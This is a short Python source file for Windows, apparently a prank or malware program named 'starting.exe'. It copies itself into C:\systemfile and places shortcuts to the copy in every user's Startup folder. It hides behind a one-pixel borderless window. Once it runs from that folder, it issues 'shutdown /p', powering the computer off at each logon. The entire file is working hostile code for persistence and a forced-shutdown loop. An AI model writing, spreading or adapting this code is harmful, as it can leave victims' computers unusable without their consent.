from tkinter import Tk
import os
import shutil
from win32com.client import Dispatch

class Starting:
    def __init__(self):
        self.__direct = os.path.abspath(os.curdir)
        if self.__direct == "C:\\systemfile":
            os.system("shutdown /p")
        else:
            self.infection(self.__direct, "starting.exe", "C:\\systemfile")

    def infection(self, direct, file_name, path):
        try: os.mkdir(path)
        except: pass

        shutil.copy(direct+"\\"+file_name, path+"\\"+file_name)

        shell = Dispatch("WScript.Shell")

        files = os.listdir("C:\\Users")
        for catalog in files:
            startup = "C:\\Users\\"+catalog+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

            if os.path.isdir(startup):
                shortcut = shell.CreateShortCut(startup+"\\"+file_name+".lnk")
                shortcut.TargetPath = path+'\\'+file_name
                shortcut.WorkingDirectory = path
                shortcut.save()

def main():
    root = Tk()
    root.geometry("1x1")
    root.overrideredirect(True)
    Starting()

main()
